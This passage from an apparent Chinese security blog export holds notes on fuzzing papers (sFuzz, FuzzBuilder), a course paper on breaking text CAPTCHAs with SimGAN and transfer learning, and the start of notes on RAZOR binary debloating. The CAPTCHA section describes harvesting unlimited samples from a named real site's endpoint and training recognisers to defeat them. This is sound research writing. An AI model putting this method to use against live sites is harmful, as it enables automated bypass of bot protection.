无法被任意赋值，很多条件根本无法满足，这是其方法上的重大缺陷。\n为了分析 sFuzz 的 soundness，作者手动检查了从结果中随机采样的智能合约，最终数量和真阳率结果如下表所示：\nAdaptiveness 图表说明 AFL 的策略容易覆盖大多数分支，而自适应策略平均来讲也贡献了三成的 test cases。而且仅仅是运行了两分钟的结果，延长运行时间效果还会提高。\n相关工作 智能合约 Fuzzer：ContractFuzzer 可以检查7种不同类型的漏洞，但并没有使用任何反馈来改进。Echidna 据说能够检查合约是否违反了某些用户预定义的属性，但未找到任何相关出版物。\n符号执行引擎：有 teEther 和 MAIAN，sFuzz 可以与之结合形成混合的 fuzzing engine\n还可与形式化验证 (formal verification) 和对智能合约的分析相联系\n成果总结 针对智能合约的 Fuzz 是较新的领域，ContractFuzzer 应该是最早且引用最多的文章，而本文提出的 sFuzz 主要贡献在于使用自适应的策略以有效地覆盖 AFL 无法进入的分支。个人有收获的点：对问题的定义，test case 的表示（将函数调用编码为 bit vector），遗传算法部分是关键但缺乏相关背景无法完全理解。\n参考文献 [1] Nguyen, Tai D., et al. \u0026ldquo;sfuzz: An efficient adaptive fuzzer for solidity smart contracts.\u0026rdquo; Proceedings of the ACM/IEEE 42nd International Conference on Software Engineering. 2020.\n[2] Jiang, Bo, Ye Liu, and W. K. Chan. \u0026ldquo;Contractfuzzer: Fuzzing smart contracts for vulnerability detection.\u0026rdquo; 2018 33rd IEEE/ACM International Conference on Automated Software Engineering (ASE). IEEE, 2018.\n[3] Atzei, Nicola, Massimo Bartoletti, and Tiziana Cimoli. \u0026ldquo;A survey of attacks on ethereum smart contracts (sok).\u0026rdquo; International conference on principles of security and trust. Springer, Berlin, Heidelberg, 2017.\n[4] Luu, Loi, et al. \u0026ldquo;Making smart contracts smarter.\u0026rdquo; Proceedings of the 2016 ACM SIGSAC conference on computer and communications security. 2016.\n[5] Grieco, Gustavo, et al. \u0026ldquo;Echidna: effective, usable, and fast fuzzing for smart contracts.\u0026rdquo; Proceedings of the 29th ACM SIGSOFT International Symposium on Software Testing and Analysis. 2020.\n","date":"2022-04-07T13:46:52Z","permalink":"https://chinggg.github.io/post/sfuzz/","tags":["论文笔记","安全","Fuzz","BlockChain"],"title":"sFuzz: 高效自适应的智能合约 fuzz"},{"categories":["论文"],"contents":"本文将对 ACSAC 2019 会议论文 FuzzBuilder: Automated building greybox fuzzing environment for C/C++ library 进行解读。这篇论文的主要亮点是利用单元测试为没有可执行文件的库自动生成 Fuzz 环境，通过修改 LLVM IR 以收集 seeds 并生成 executable。\n论文地址：https://dl.acm.org/doi/10.1145/3359789.3359846\n源码地址：https://github.com/hksecurity/FuzzBuilder\n幻灯地址：https://www.acsac.org/2019/program/final/1/265.pdf\n论文作者：Joonun Jang(Samsung Research), Huy Kang Kim(Korea University)\n引言 Greybox fuzzing has been researched extensively, which is well known for its advantage of not only being able to test with only binarie but also useful when source code is available. Therefore, it is necessary to apply greybox fuzzing to a development process to prevent security vulnerabilities at an early stage.\nSince greybox fuzzing requires execution of program, things get tough when it comes to library fuzzing. A simple approach for fuzzing a library is to generate an executable that calls library API functions and then fuzzing the generated executable. To this end, testers should manually write code that achieves high code coverage, which is a labor-intensive job requiring in-depth knowledge of libraries.\nSo we propose a novel approach to generate executables automatically through analysis of unit tests in project。\n动机背景 Library Fuzzing vulnerabilities in libraries can be more critical\nlibrary API: a set of functions that a library exports\nlibrary fuzzing requires a set of instructions to call library API functions with input values\n提到了 Libfuzzer，只需实现 LLVMFuzzerTestOneInput(const uint8_t *data, size_t size)，在其中以 data 和 size 为参数调用 library API function 即可。还需选择一个 base function，其将数据载入内存以供 library 使用，接着就能选取其他的 library API functions 以 test various features of a library.\n想要自动化这个过程，生成的 executable 要能够：\n 从 fuzzer 中获取值 将值通过 base function 传给 target library 调用与 base function 相关联的不同 library API function  Function Sequence   a set of functions to be tested jointly\n  order of calling library API functions should be considered\n  various function sequences should be considered\n  Fuzzable API   a base library API function used to pass fuzzer inputs to library\n  generated executable should include (FA)+\n  Unit Test 前面的定义都是理论，此时图穷匕现，实际上 FuzzBuilder 单纯就是 generate executables and seeds by using prepared function sequences and test inputs in unit tests\na successful unit test should have:\n various function sequences a variety of test inputs high code coverage (as a result)  另外 3.2 节中还有对 unit tests 的两个假设，也是 JUnit 提倡的最佳实践:\n each test is implemented as a function each test is independent of each other  实验方法 文章的核心，要实现 automated generation of executable and seed，重点是 executable，注意虽然表述为 executable generation 但代码本身只是修改 LLVM bitcode，还需手动编译链接，难点主要在于熟练掌握 LLVM IR Builder API 以实现全局变量的创建和分支跳转。\nProcess of Seed Generation:\n Modify library FA so it will write input to a file Remake and execute unit test Store seeds to separate files  Process of Executable Generation:\n select FA preprocess: collecting test functions insert_interface: getting input from fuzzers remove_test: removing unnecessary test functions insert_operands: replacing operands of FA  用户配置如下\n// https://github.com/libexpat/libexpat // seed.conf，收集 seeds 时使用 { \u0026quot;targets\u0026quot; : [ [ \u0026quot;XML_Parse\u0026quot;, 2, 3 ]], \u0026quot;files\u0026quot; : [ \u0026quot;xmlparse.bc\u0026quot; ] } // bug.conf，生成 exe 时使用 { \u0026quot;targets\u0026quot; : [ [\u0026quot;XML_Parse\u0026quot;, 2, 3] ], \u0026quot;files\u0026quot; : [ \u0026quot;runtests.bc\u0026quot; ], \u0026quot;tests\u0026quot; : [ \u0026quot;test_\u0026quot; ], \u0026quot;skips\u0026quot; : [\u0026quot;test_alloc_nested_groups\u0026quot;, \u0026quot;test_ABC\u0026quot;] }  其中 targets 就是 Fuzzable API 的列表，函数名后跟着两个分别是 buf 和 len 在该函数 args 中的位置（从1开始计数），files 是要读取并修改的 LLVM bitcode 文件，会作为 Module 加载到 IRReader 中。test 和 skip 只有在生成 exe 时使用，前者用于粗略获取单元测试函数，后者用于排除。\n收集 seed 就是要获取单元测试的输入，修改 library FA，用 LLVM IRBuilder 在函数的 entry block 插入一段 BB，将输入数据写入 COLLECT_PATH 指定的文件中，再 Br 回原来的 BB 继续执行，具体实现在 IRWriter::collect() 中。\n将修改后的 .mod.bc 编译为 .o，并 ar 到整个库的 .a 上，再运行单元测试，数据就会被写入到指定文件，运行 seed_maker.py 会再读取并整齐地保存到 seeds 目录下。\n（一个坑点是收集完 seed 后 .o 仍处于被修改状态，记得用原来的代码重新编译，否则后续 Fuzz 的输入通通都会写入文件，直接挤爆硬盘）\n生成 executable 需要在单元测试的 IR 上插桩，先让 IRReader 遍历 modules 按用户配置的 tests 和 skips 收集所有 targets（不是 FA 而是 test_ABC） 以备后面插桩使用。然后在 modules 中找到 entry function（即运行单元测试的入口 main 函数），IRWriter::interface() 先在对应 module 中创建 global 的 buf 和 size，set CommonLinkage 并初始化为0， 然后在 entry block 插入 BB，在循环中以 4K 为单位 read stdin 到栈上的 tmp，并每次在堆上分配更大的空间，拷贝之前的 global buf 和新读入的 tmp，将 global buf 原来的空间释放后指向新分配的空间，直到 read 不足 4K 或返回 -1，这样就插入了一个 interface 将标准输入全部读到 global buf 中。\n可将插入 interface 的 LLVM IR 翻译为如下 C 代码\nchar* fuzzbuilder_buf; int fuzzbuilder_size; int main() { entry1: char *tmp = alloca(4096); // GEP in llvm read_n1 = read(0, tmp, 4096); if (read_n1 == -1) goto link; else goto entry2; entry2: char* p = calloc(read_n1 + 1, 1); fuzzbuilder_buf = p; memcpy(p, tmp, read_n1); fuzzbuilder_size += read_n1; // load, add, store if (read_n1 == 4096) goto entry3; else goto link; } entry3: goto entry4; entry4: read_n2 = read(0, tmp, 4096); if (read_n2 == -1) goto link; else goto entry5; entry5: char *p2 = calloc(fuzzbuilder_size + read_n2 + 1, 1); memcpy(p2, fuzzbuilder_buf, fuzzbuilder_size); memcpy(p2 + fuzzbuilder_size, tmp, read_n2); free(fuzzbuilder_buf); fuzzbuilder_buf = p2; fuzzbuilder_size += read_n2; if (read_n2 == 4096) goto entry4; else goto link; link: // original code ...  再将分支跳转简化为如下循环：\nchar* fuzzbuilder_buf; int fuzzbuilder_size; int main() { char *tmp = alloca(4096); int read_n; while((read_n = read(0, tmp, 4096)) != -1) { char * p = calloc(fuzzbuilder_size + read_n + 1, 1); memcpy(p, fuzzbuilder_buf, fuzzbuilder_size); // 1st: memcpy(p, 0, 0) memcpy(p + fuzzbuilder_size, tmp, read_n); free(fuzzbuider_buf); fuzzbuilder_buf = p; fuzzbuilder_size += read_n; if (read_n != 4096) break; } // original code ... }  接着 insert_fuzz_to_tests(targets)，对每个 function（变量名是 targets 但实际上是单元测试中的 test_ABC 而非 library 中的 FA）进行 IRWriter::fuzz()，遍历 function 中的所有 CallInst 和 InvokeInst，若 inst-\u0026gt;getCalledFuncion() 即 callee 在 targets 中则将 inst 加入集合，最后遍历集合中的 inst，读取配置中对应 target 的 fuzz 和 len 参数位置，用 gv_buf 和 gv_s 分别替换，即调用 inst-\u0026gt;setArgOperand(idx, \u0026amp;v)，这样 test_XX 中对 FA 的调用都被修改为传入 global buf 中的数据，也就是之前从 stdin 读入的数据，重新编译后就可以用 AFL 进行 fuzz 了。值得注意的是 IRWriter::fuzz() 中还把 __assert_fail 与 abort 全部移除了，论文中只在末尾 Discussion 处提到，可能是后来实现的。\n此外 insert_skip_to_tests(skips) 会遍历 skip functions，只处理返回类型为 void 或 int 的，原有内容全部清除，直接返回 void 或 0\n效果验证 Experiment Design：\n The efficiency of generated seeds The effectiveness of generated executables The effectiveness of FuzzBuilder as a bug finding tool.  Metrics:\n Line coverage Number of discovered bugs  Comparative Evaluation: OSS_Fuzz\n相关讨论 Related Work 就是提了下 Greybox Fuzzing 和 OSS-Fuzz，Fuzz Builder 的好处在于能从单元测试的输入自动得到较有效的 seeds，并且也不像 Libfuzzer 那样要手写 fuzz 代码。\nFuture discussion:\n FA automation Optimization of generated executable Errors in unit test Expansion of input value types  个人感觉 errors in unit tests 是比较实际的，一些单元测试不会考虑 unexpected value 或者用 assert abort 来退出，这样 fuzzer 的输入很可能导致程序异常终止从而被视为 bug，但这不算 library 本身的 bug 所以导致 false alarm。\n个人总结 一句话概括就是 make unit test fuzzable，在 library FA 处插桩以收集单元测试的数据作为 seed，在测试代码的 entry 插桩以创建从 fuzzer 获取数据的 interface 并更改所有调用 FA 的指令使其传入来自 fuzzer 的全局 buf 数据，就得到了可供 fuzzer 运行的代码。\n论文前期铺垫了很多 Fuzzable API, Function Sequence 之类的概念设定，但 2.4 节之后引入 unit test 却没有很好地联系，感觉前后有些割裂。\n感谢作者公开了代码并尽可能地给出了使用示例，代码为 C++ 编写，使用了单例模式，整体较为清晰，但 IRReader 和 IRWriter 中函数似乎有些冗余，尤其是 targets = get_functions_to_fuzz() 的过程，加上变量命名为 targets 但其实是 tests，给理解造成障碍。\n原本的代码基于 LLVM 6.0，而自己机器已经到 LLVM 13 了，不想使用提供的 Docker 环境，于是入门了 LLVM IR 的基本概念，微改代码以适配 LLVM 的 API 变动，为了更好地在 VS Code 中调试还配置了 CodeLLDB。\n参考资料 LLVM Language Reference Manual\nThe Often Misunderstood GEP Instruction\nYoutube Tutorials\nLLVM 教程中文版\n","date":"2022-03-14T13:46:52Z","permalink":"https://chinggg.github.io/post/fuzzbuilder/","tags":["论文笔记","安全","Fuzz"],"title":"FuzzBuilder: 为 C/C++ library 自动构建灰盒模糊测试环境"},{"categories":["论文"],"contents":"基本信息 摘要：验证码是保护网站免受恶意攻击的一种常见机制，其中基于文本的验证码使用最为广泛。虽然机器学习技术已对其安全造成威胁，但现有的大多数攻击都耗时耗力，需要预处理图片或者大量人工标注数据。在这篇文章中，我们试图通过利用SimGAN使模拟验证码与真实验证码更加相似，从而训练出一个端到端的模型来识别真实验证码。然而，我们的实验结果不能表明SimGAN对准确性有任何积极影响。相反，转移学习中的微调过程才是关键因素，它仅凭一些有标签的真实图像就能大大提高模型性能。\n关键词：验证码识别，生成对抗网络，迁移学习\nAbstract: CAPTCHA is a common mechanism to protect websites from malicious computer bots, among which text-based captcha is the most widely used. While machine learning techniques have posed a threat to them, most of the existing attacks either require image preprocessing or a large number of manually labeled data, which is time-consuming. In this article, we try to train an end-to-end model to recognize real CAPTCHAs with just synthetic samples, by utilizing SimGAN to make simulated CAPTCHAs more similar to the real ones. However, our experiment results cannot show SimGAN have any positive impact on the accuracy. Instead, transfer learning, especially the fine-tuning process is the key factor which can improve the performance of the model significantly by just a few labeled real images.\nKeywords: Captcha Attack; Transfer Learning; Generative Adversarial Network\n引言 验证码的全称是全自动区分计算机和人类的图灵测试（Completely Automated Public Turing test to tell Computers and Human Apart，CAPTCHA），在2003年由路易斯·冯·安(Luis von Ahn)等提出，在互联网活动中起着重要作用，诸如在网站注册、登录和密码找回等环节中，验证码能有效抵御自动化攻击。 尽管验证码的新形态不断出现，原始的字符验证码仍然在被广泛应用，攻击方和防守方的不断对抗也在不断进行，字符形态的扭曲，连人类都不一定能准确识别。但随着深度学习的流行，识别方开始占据上风，利用 CNN 等神经网络训练的模型能达到很高的识别率。 然而基于监督学习的神经网络依赖于海量的标签数据，需要前期人工标注打码，成本高昂，而且模型的迁移性较差，一旦验证码生成方式改变，就需重新打码并训练模型。如何利用无标注的数据进行分类，自监督学习、半监督学习、伪标签，数据增强等手 本文综合利用人工合成的验证码和无标注的真实验证码来训练神经网络，对某网站的验证码样本进行识别，先是尝试训练 SimGAN[2] 让合成验证码学习到真实验证码的分布，但效果不佳。最终在发表于2020年的论文 Simple and Easy: Transfer Learning-Based Attacks to Text CAPTCHA[1] 中得到结论，使用 GAN 等方式试图让合成验证码更像真实验证码对准确性的提升没有较大影响，用少量标注过的真实验证码 finetune 预训练的神经网络才能大大提高准确率。\n验证码安全概述 验证码的种类与发展 按照信息类型的不同，现有的验证码可分为两类：一类是基于视觉的验证码，包括文本类验证码和图像类验证码；另一类是基于听觉的语音类验证码，基于视觉的验证码通过识别验证码中对象所属的类别实现验证，基于语音的验证码则匹配语音中包含的验证信息实现验证。 早期的验证码，都是基于人可以一目了然看懂文字，而不能轻易让程序实现分类而出发。然而，随着计算机发展的愈发智能和类人化，我们能否还能区分人与计算机？这是验证码的根本问题。Alpha Go 击败人类顶尖棋手让我们看到了 AI 在解决特定任务上的出色能力，为了不让验证码被自动化轻易程序识别，验证码的外在形态和任务逻辑早已变得非常复杂，长期对抗下来，就形成了机器人和用户都看不懂的尴尬局面，用户的体验成了这场战争中的牺牲品。所以业界也在尝试应用基于行为的新型验证码，将更多更强的风控 SDK 嵌入前端，从而依据滑动轨迹，浏览器特性，前端代码保护等能力，将对抗迁移到用户层迁移到了代码层，不再单纯依赖用户是否正确完成任务来进行判定，验证码对抗进入新的时代，不过这不是本文讨论的重点。\n文本型验证码的对抗 由于文本类验证码具有交互方式简单、密码空间大且场景适应性强等特点，在实际应用中被广泛接受．调查发现，在Alexa发布的全球综合排名前50的网站中，80％的网站在登陆、注册、输错密码或者密码找回环节中使用验证码来抵御自动化攻击，其中包含微软、百度等在内的 60% 的网站均在使用文本类验证码。[5]\n因此，深入研究文本类验证码的安全性对于改进传统验证码生成方法具有重要意义，本文研究对象及下文所提到的验证码皆为文本类验证码。\n最初的文本验证码仅仅只是手写字体样本标注的识别问题，比如下图中的验证码，曾经有一部分是取自历史书籍的截图，从而借网友之力标注文本的图书馆转为电子档。\n这种验证码，易于切割文字清晰，很快就能被破解。目前，文本验证码的安全性主要靠背景干扰信息和字符粘连两个因素来进行保证，这两个安全特征都在不同程度上增加了识别难度和分割难度。除此之外还有中文和动态 GIF 验证码来增加分类数量或提高定位难度，但可能影响用户体验，所以常见的码仍以字符重叠、扭曲、倾斜和偏移为主。\n传统方法识别文本型验证码的步骤如下：首先，通过二值化、空间滤波、变换等图像处理技术去除验证码中的干扰信息。其次，使用投影、类聚或目标检测等方法确定字符在图像中的位置并进行分割。最后，利用SVM、KNN等机器学习方法提取字符特征并进行分类识别。[6]\n基于神经网络的深度学习方法则无需繁琐的图像预处理步骤，强大的神经网络可以进行端到端的学习预测，但模型的解释性较差，且需要大量标注样本。\n基于SimGAN的生成对抗网络 生成对抗网络 生成对抗网络（Generative Adversarial Networks，GAN）的诞生受到博弈论的启发，通过对抗训练的方式来使得生成网络产生的样本服从真实数据分布，其中博弈双方分别是判别网络（Discriminative Network）和生成网络（Generative Network），判别网络的目标是尽量准确地判断一个样本是来自于真实数据还是由生成网络产生，生成模型的目标是尽量生成判别网络无法区分来源的样本。这两个目标相反的网络不断地进行交替训练。当最后收敛时，如果判别网络再也无法判断出一个样本的来源，那么也就等价于生成网络可以生成符合真实数据分布的样本。\n判别网络𝐷(𝒙; 𝜙)的目标是区分出一个样本𝒙是来自于真实分布 𝑝𝑟(𝒙) 还是来自于生成模型 𝑝𝜃(𝒙)，因此判别网络实际上是一个二分类的分类器．用标签𝑦 = 1来表示样本来自真实分布，𝑦 = 0表示样本来自生成模型，判别网络𝐷(𝒙; 𝜙)的输出为𝒙属于真实数据分布的概率，即𝑝(𝑦 = 1|𝒙) = 𝐷(𝒙; 𝜙), 则样本来自生成模型的概率为𝑝(𝑦 = 0|𝒙) = 1 − 𝐷(𝒙; 𝜙)\n给定一个样本(𝒙,𝑦)，𝑦 = {1,0}表示其来自于𝑝𝑟(𝒙)还是𝑝𝜃(𝒙)，判别网络的目标函数为最小化交叉熵，即\n生成网络的目标刚好和判别网络相反，即让判别网络将自己生成的样本判别为真实样本\n上面的这两个目标函数是等价的．但是在实际训练时，一般使用前者，因为其梯度性质更好。\nSimGAN论文解读 SimGAN 是苹果公司的首篇 AI 论文，获得了2017年的 CVPR 最佳论文奖，论文全名是 Learning from Simulated and Unsupervised Images through Adversarial Training，即使用「模拟+无监督」的学习方法，通过没有标签的真实图片来提高仿真器生成图片的真实性，同时还保持原有合成图片的标签，最终得到一批带标签的，真实的图像数据集。\n论文中构建了如上图所示的 GAN 网络，简称 SimGAN 。经典的GAN是先从标准正态分布开始逐步接近训练数据的分布，而在 SimGAN 中则是模拟器生成一批带标签的合成图片，然后将合成图片送入到修正器 Refiner 中，Refiner 学习真实图像的一些特征，对合成图像进行修正，得到修正后的图像与未标注的真实图像一同送入分辨器中。如果分辨器将修正后的图像判别为真实，则固定 Refiner 的参数不变，根据损失函数，反向传播来优化分辨器的参数；如果判别为假，则固定分辨器的参数，对 Refiner 的参数进行优化。\n上述公式表示 Discriminator 用来更新参数的损失，其中 $\\tilde{x} _i$ 表示合成图片, $y_j$ 表示真实图片，Dφ是输入为合成图片的概率，1-Dφ是输入为真实图片的概率，其实就是二分类交叉熵损失函数。\n上述公式表示 Refiner 需要同时最小化两个损失来更新参数，其中 $l_{real}$ 是合成图片与真实图片y之间的差异，第二部分$l_{reg}$是修改过后的图像与原合成图像的差异。\nRefiner 要最小化$l_{real}$，即尽可能让 Discriminato r将合成图像误分类为真实图像，最小化$l_reg$是为了惩罚修正后的图像和原始图像之间的巨大差别，避免 Refiner 在修正合成图片的时候用力过猛修改了图像的内容，这也是本文相比于经典 GAN 的一个创新点。\n还有一个创新点作者定义的 Discriminator 是局部分辨器而非全局分辨器。将输入分辨器的图像进行分割，将其分成 w*h 的小块，逐块的送入分辨器中，这样限制了接受域的大小，避免了 Refiner 过分强调对某一部分的修正来欺骗分辨器，而且这样分块之后一幅图像对应着 w*h 个样本，丰富了样本的数量。\n在无标注真实验证码上的实验 验证码的选取与合成 真实验证码来自 https://passport.bilibili.com/web/captcha/img，每次访问该地址都会随机更新图片且没有频率限制。观察发现该验证码的长度为5，所用字符集为大写字母及数字，颜色均为黑白，没有背景噪音且扰动规律较明显，即字符统一向左或向右倾斜一定角度，略有扭曲，且有一长一短两条线划过字符。\n为生成与之相似的验证码，使用了 wheezy.captcha 以合成带有干扰线和扭曲的验证码，共计生成十万余张，真实验证码与最终生成验证码对比如下：\n网络的构建与训练 本文构建了三个不同的神经网络，即用于从图片识别验证码文本的 Recognizer，判断验证码是否为合成的 Discriminator 和对合成验证码进行修改的Refiner。\nRecognizer即用于图像分类的神经网络，我们期望得到的分类结果是验证码字符串，但网络的输出只有数字，因此手动实现了 one hot 编码，网络最后一层输出的大小即为 串长*字符集长度，将其进行一些 reshape 操作即可解码为字符串。在具体网络模型的选择上，最开始仅选用了三层的 CNN 网络，虽然训练较快，20个 epoch 后就能达到90%左右的准确率，但后续实验表明其泛化能力差，在真实验证码上的准确率不理想，后来受论文的启发替换为 ResNet101，训练了不到10个 epoch 就达到了接近99%的准确率。\nDiscriminator 也是 CNN 网络，是一个二分类器，区分一个验证码是我们合成的还是真实的样本集。\nRefiner 是一个 ResNet，输入尺寸与输出尺寸相同，它在像素维度上去修改我们生成的图片，而不是整体的修改图片内容，这样才可以保留整体图片的结构和标注。\nGAN的训练最为关键也最为困难，官方没有公开自己的训练代码，仅有如下算法描述，大致框架与经典的GAN相同。\n上图中 Refiner 和 Discriminator 都是选用了 SGD 作为优化算法，而参考了一些网上复现的代码，Refiner 都改用了 Adam，Kg和Kd的选取也需要大量微调，除此之外论文中还使用了一些 trick，比如设置了一个缓存区来存储分辨过的修正后图像，每次向分辨器送入一批次图像时总是从缓存中选取一部分共同参与训练，这样做的好处就是可以避免修正器重新引入了被分辨器遗忘的伪迹，并且避免训练发散。\n交替训练了500个step后，用Refiner修改后的图片只是变得模糊，似乎并没有更接近真实图片。\n效果验证 由于没有时间手动标注真实验证码，所以本文不会计算准确率，而是随机挑选样本中的单张真实验证码图片进行预测，反复几次后既能直观地估计其效果。\n预测真实验证码使用了三种方法：直接使用合成验证码训练出的Recognizer对真实图片进行预测；使用Refiner修改后的图片训练Recognizer对真实图片进行预测；用Refiner修改输入的真实图片再让Recognizer进行预测\n从结果看使用GAN训练的Refiner对提升识别准确率并没有帮助，Recognizer模型本身的选取反而有较大影响，开始仅使用了三层CNN网络，根本无法用于识别真实验证码，换用ResNet101后，如上左图所示，仅在合成验证码上训练过却偶然能识别正确4个字符。而另两张图表明引入Refiner后并没有可感的提升。这里能识别出部分字符应该主要是靠ResNet101的强大学习能力和手工合成验证码的一定相似度，GAN并没有发挥作用。\n基于迁移学习的改进方法 迁移学习的基本概念 上述实验用合成图片去训练模型，并试图让其在真实图片上达到较高准确率，实际上有违深度学习的通常假设，即训练数据与测试数据在相同的特征空间且拥有相似的分布。但收集标注样本的成本太高，现实生活中测试样本往往是不太充足的，如果模型也能像人类学习那样利用已有的知识对不同任务举一反三，触类旁通，则只需标注少量的数据即可，迁移学习的概念正是由此引出。\n在迁移学习中，有两个基本的概念：领域 (Domain) 和任务 (Task)。[4]\n领域 (Domain): 是进行学习的主体，主要由两部分构成：数据和生成这些数据的概率分布。通常我们用花体 D 来表示一个 domain，用大写斜体 P 来表示一个概率分布。特别地，因为涉及到迁移，所以对应于两个基本的领域：源域 (Source Domain) 和目标域 (Target Domain)。源域 $D_s$就是有知识、有大量数据标注的领域，是我们要迁移的对象；目标域 $D_t$ 就是我们最终要赋予知识、赋予标注的对象。知识从源域传递到目标域，就完成了迁移。\n任务 (Task): 是学习的目标。任务主要由两部分组成：标签和标签对应的函数。通常用花体 Y 来表示一个标签空间，用 $f(·)$ 来表示一个学习函数。 相应地，源域和目标域的类别空间就可以分别表示为 $Y_s$ 和 $Y_t$。我们用小写 $y_s$ 和 $y_t$ 分别表示源域和目标域的实际类别。\n迁移学习 (Transfer Learning): 给定一个有标记的源域 $ D_s={ \\lbrace x_i , y_i \\rbrace }{i=1}^n $ 和一个无标记的目标域 $D_t= {\\lbrace x_j \\rbrace}^{n+m}{j=n+1}$。这两个领域的数据分布 $P(X_s)$ 和 $P(X_t)$ 不同，即 P(xs)≠P(xt)。迁移学习的目的就是要借助 Ds 的知识，来学习目标域 Dt 的知识 (标签)。\n迁移学习在不同合成样本上的效果 本文先前实验中使用了SimGAN但效果不佳，GAN是否真的能让合成验证码学习到真实验证码的属性？论文[1]解答了我的疑问。作者对25种验证码进行了实验，最终得出结论，使用GAN去精炼合成后的样本以让其更像真实样本并不能对结果有较大提升，而迁移学习最后使用少量样本的 fine-tuning 环节才是关键所在。论文中识别验证码的整体方法流程如下图所示：\n本文先前的尝试由于没有标注任何真实验证码，因此只对应了前两步，即合成验证码并使用其作为样本来预训练一个基本的模型，而没有最后的微调环节。还有一点不同之处需要注意，此处合成的验证码均为最常规的形状，并不追求与真实验证码有任何相似，fine-tuning 前后的识别成功率如下表所示，可以看到尽管之前识别率极低，但 fine-tuning 后表现都极为出色。\n之前的相关工作往往费尽心思让合成的验证码更像真实验证码，甚至用上类似 SimGAN 的深度学习方法，而论文作者对此表示怀疑，为了分析合成验证码与真实验证码在外观上的相似度对识别率的影响，作者先是用传统的图像处理方法手工模拟得相似的验证码，再利用 GAN 试图让手工合成的验证码更像真实验证码，并分别进行实验，下图分别为手工模拟和 GAN 调整后的结果：\n左图中第一栏第二种验证码正是本文先前尝试攻击的对象，可以看出手工调整后的验证码风格与真实验证码十分接近。而右图中 SimGAN 在肉眼上并未产生使人信服的修改效果，甚至随着训练次数增加图片可能越来越模糊以至无法辨认。\n上两张表的实验结果表明，只用手工合成的相似验证码去预训练有一部分亦能达到可观的准确率，而用 GAN 继续拟合对准确率没有明显的正面影响。\n因此论文作者得出了两个结论：花费时间让合成的验证码更像真实验证码对迁移学习来说是多余的无用功，最后的 fine-tuning 环节才是关键；文本型验证码确实不再安全，只需手工标注几百张样本即可以通过迁移学习达到较高的准确率。\n总结与展望 由于工作中时常遇到验证码相关的风控对抗，故选择了验证码识别这一课题，在有大量标注数据的情况下其实只需套用 SOTA 模型即可。但如 Yann LeCun 所指出，无监督学习或者说自监督学习才是最大的蛋糕，所以本文坚持不手动标注真实验证码，而尝试利用 SimGAN 增强过的合成数据实现无标注的验证码识别，最开始效果完全无法接受。后来受到论文[1]启发换用了 ResNet101 作为识别模型，识别结果更加可靠。但此文也已经用实验证实了用 GAN 去增加合成数据与真实样本之间的相似程度并不能提升识别准确率，要想达到高可用的结果仍然需要少量有标签的样本进行迁移学习。\n参考文献 [1]\tWang, Ping, et al. \u0026ldquo;Simple and easy: Transfer learning-based attacks to text CAPTCHA.\u0026rdquo; IEEE Access 8 (2020): 59044-59058.\n[2]\tShrivastava, Ashish, et al. \u0026ldquo;Learning from simulated and unsupervised images through adversarial training.\u0026rdquo; Proceedings of the IEEE conference on computer vision and pattern recognition. 2017.\n[3]\tYe, Guixin, et al. \u0026ldquo;Yet another text captcha solver: A generative adversarial network based approach.\u0026rdquo; Proceedings of the 2018 ACM SIGSAC Conference on Computer and Communications Security. 2018.\n[4]\tJindon Wang et al., . \u0026ldquo;Transfer Learning Tutorial.\u0026rdquo; (2018).\n[5]\t汤战勇,田超雄,叶贵鑫,李婧,王薇,龚晓庆,陈晓江,房鼎益.一种基于条件生成式对抗网络的文本类验证码识别方法[J].计算机学报,2020,43(08):1572-1588.\n[6]\t曹廷荣,陆玲,龚燕红,贾惠珍.基于对抗网络的验证码识别方法[J].计算机工程与应用,2020,56(08):199-204.\n","date":"2022-03-05T13:46:52Z","permalink":"https://chinggg.github.io/post/captcha-ml/","tags":["课程论文","安全","AI"],"title":"End-to-End Captcha Recognition With Few Labels: From SimGAN to Transfer Learning"},{"categories":["论文"],"contents":"RAZOR: software debloating 论文信息 原文作者：Chenxiong Qian, Hong Hu, Mansour Alharthi, Pak Ho Chung, Taesoo Kim, and Wenke Lee, Georgia Institute of Technology\n原文标题：RAZOR: A Framework for Post-deployment Software Debloating\n发表会议：USENIX SECURITY \u0026lsquo;19\n原文链接：https://www.usenix.org/system/files/sec19-qian.pdf\n代码链接：https://github.com/cxreet/razor\n问题背景 商业软件的功能越做越多，终端用户只用到一小部分，软件往往显得臃肿，这不仅浪费耗费系统资源，还带来了更多攻击面，而 software debloating 可以解决此问题。\n但以往的工作需要获取软件源码，而用户往往只有分发部署后的二进制程序，且不同用户所需的功能各异，所以 post-deployment 软件更加具有实际效用。\npost-deployment software debloating 有以下两个挑战：\n 如何让不了解软件内部的用户选择要保留和移除的功能 如何修改二进制程序，在删除无用功能的同时保留所需  对于第一个挑战，可以让用户提供输入样例，但即使输入完全相同，多次执行时也可能产生不同的程序执行路径，所以要识别出 necessary-but-not-executed 的那部分程序，即 related-code，很难获得完全正确的答案，所以作者使用了启发式的方法，以四个层次递进，逐步扩大覆盖范围。\n对于第二个挑战，收集完 related-code 后，就可以重写二进制程序，通用的二进制重写依赖于可靠的反汇编结果和完整的 CFG，故而较为困难。对于 software debloating 而言仅需重写要执行的那部分功能，通过 trace 就可获得 CFG，因而可以实现二进制重写。\n系统设计 如图所示，即 Tracer, Path Finder 和 Generator\nExecution Trace Collection Tracer 以所给测试数据执行程序，记录三种控制流信息：\n Executed instructions (memory addr \u0026amp; raw bytes) Conditional Branches Indirect Calls/Jumps  Instruction-level recording 可以应对动态生成的代码，但效率不高，考虑到现实中的程序大多只有静态的代码，所以 Tracer 先从 basic block level 开始记录，检测到疑似动态代码生成的特征再切换到 instruction level。\nTracer 综合运用了基于软件的工具 (Dynamorio) 与基于硬件的工具 (Intel PIN 和 Intel PT)，前者普适性好但性能较差，后者高效但无法保证信息完整，三种 trace 技术可能产生不同的程序执行，用户可以选择最适合的或合并 trace 结果来获得更好的代码覆盖度。\n收集完 trace 结果后，就能反汇编二进制程序并构建所需的部分 CFG。\nHeuristic-based Path Inference 由 Tracer 获得的 CFG，用启发式方法扩展 CFG，获得 related-code\n zCode，无新增指令，CFG 上只连边不加点 zCall, 无新函数调用，若 non-taken 分支不含任何 call 指令，则加进 CFG zLib, 无任何额外的库函数，若 non-taken 分支只 call 同 binary 的函数或已被 call 的库函数，则加进 CFG zFunc, 无不同功能的库函数，若 non-taken 分支 call 的外部函数不涉及新的 functionality，则加进 CFG  算法如下图所示\nDebloated Binary Synthesization  先将原始二进制程序按照 CFG 反汇编，生成包含所有必要指令的伪汇编(pseudo-assembly) 修改伪汇编创建有效的汇编文件，symbolize basic blocks, 